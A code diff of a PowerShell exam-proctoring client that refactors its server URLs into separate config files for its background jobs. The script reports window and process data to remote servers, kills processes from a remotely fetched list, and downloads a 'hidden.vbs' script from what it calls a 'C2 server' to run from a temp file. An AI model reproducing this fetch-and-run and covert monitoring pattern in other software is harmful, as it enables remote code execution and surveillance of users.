@@ -37,23 +37,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 # Define proctoring functions into a variable to use it in background jobs
 $functions = {
     #---------------------------------------------------------------------------------------------------------------------
-    #                                                   Variables Definition
-    #---------------------------------------------------------------------------------------------------------------------
-    #Web Server for interval tracking
-    $interval_base = 'https://rapid.tlnas.duckdns.org/interval.php?'
-    #Web server for processing string data
-    $sending_base = 'https://rapid.tlnas.duckdns.org/process.php'
-    #Web server for processing list data
-    $sending_list_base = 'https://rapid.tlnas.duckdns.org/process_list.php'
-    #Webserver for getting public key
-    $key = 'https://rapid.tlnas.duckdns.org/get_public_key.php'
-    #Heartbeat
-    $heartbeat = 'https://rapid.tlnas.duckdns.org/ping.php?'
-    #Proctoring Device's URL
-    $base_url = 'http://10.0.0.1:5000'
-
-
-    #---------------------------------------------------------------------------------------------------------------------
     #                                                      Basic Functions
     #---------------------------------------------------------------------------------------------------------------------
     # Function: Determine if Raspberry Pi is connected to the PC
@@ -71,27 +54,6 @@ $functions = {
     function Encode($data){
         return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
     }
-
-    #---------------------------------------------------------------------------------------------------------------------
-    #                                                    Initial Functions
-    #---------------------------------------------------------------------------------------------------------------------
-    #Retrieving publick key from web server
-    $pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
-
-    # Sending public key to Pi's Flask server in JSON format
-    $key_data = @{PuK = Encode($($pub_key.tostring()))}
-    # Result is the UUID
-    $completed = $false
-
-    if (Is_Connected -ne $null){
-        try{
-            $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data|ConvertTo-Json) -ContentType 'application/json'
-            $uuid = ($response.content | ConvertFrom-Json).uuid
-            $completed = $true
-        }
-        catch{}
-    }
-    else{break}
 
     #---------------------------------------------------------------------------------------------------------------------
     #                                                     Heartbeat Functions
@@ -276,8 +238,11 @@ $functions = {
 
 # Start the process killing job
 $killProcessJob = Start-Job -ScriptBlock {
+    param ($functionsScriptPath, $configScriptPath)
+    . $functionsScriptPath
+    . $configScriptPath
+
     function Kill_Processes {
-        $processes_url = 'https://rapid.tlnas.duckdns.org/processes.txt'  # URL to the PHP server
         $defaultProcessesToKill = @('calculatorapp', 'discord')
         $invigilatorProcessesToKill = (Invoke-WebRequest -Uri $processes_url -UseBasicParsing).Content -split ','
 
@@ -314,21 +279,38 @@ $killProcessJob = Start-Job -ScriptBlock {
             break
         }
     }
-}
+} -ArgumentList $functionsScriptPath, $configScriptPath
 
-$heartbeat = Start-Job -InitializationScript $functions -ScriptBlock{Send_HeartBeat}
+$heartbeat = Start-Job -InitializationScript $functions -ScriptBlock{
+    param ($functionsScriptPath, $configScriptPath)
+    . $functionsScriptPath
+    . $configScriptPath
+    Send_HeartBeat} -ArgumentList $functionsScriptPath, $configScriptPath
 Start-Sleep 2
-$job1 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Active_Win}
+$job1 = Start-Job -InitializationScript $functions -ScriptBlock{
+    param ($functionsScriptPath, $configScriptPath)
+    . $functionsScriptPath
+    . $configScriptPath
+    Get_Active_Win} -ArgumentList $functionsScriptPath, $configScriptPath
 Start-Sleep 2
-$job2 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Display_Prop}
+$job2 = Start-Job -InitializationScript $functions -ScriptBlock{
+    param ($functionsScriptPath, $configScriptPath)
+    . $functionsScriptPath
+    . $configScriptPath
+    Get_Display_Prop} -ArgumentList $functionsScriptPath, $configScriptPath
 Start-Sleep 2
-$job3 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Proc_List}
+$job3 = Start-Job -InitializationScript $functions -ScriptBlock{
+    param ($functionsScriptPath, $configScriptPath)
+    . $functionsScriptPath
+    . $configScriptPath
+    Get_Proc_List} -ArgumentList $functionsScriptPath, $configScriptPath
 Start-Sleep 2
-$job4 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Open_Win}
+$job4 = Start-Job -InitializationScript $functions -ScriptBlock{
+    param ($functionsScriptPath, $configScriptPath)
+    . $functionsScriptPath
+    . $configScriptPath
+    Get_Open_Win} -ArgumentList $functionsScriptPath, $configScriptPath
 Start-Sleep 2
-
-# VBS file path on the C2 server
-$vbs_url = "https://rapid.tlnas.duckdns.org/hidden.vbs"
 
 # Function: Download the VBS file content from the C2 server
 function Get-VBSContent {
@@ -346,6 +328,11 @@ function Get-VBSContent {
 function Execute-VBSContent {
     param ($vbsContent)
     try {
+        # Replace placeholders with actual values from PowerShell environment variables
+        $vbsContent = $vbsContent -replace "\{\{BASE_URL\}\}", $base_url `
+                                   -replace "\{\{KEY\}\}", $key `
+                                   -replace "\{\{SENDING_BASE\}\}", $sending_base
+
         $tempVbsFilePath = [System.IO.Path]::GetTempFileName() + ".vbs"
         Set-Content -Path $tempVbsFilePath -Value $vbsContent
 
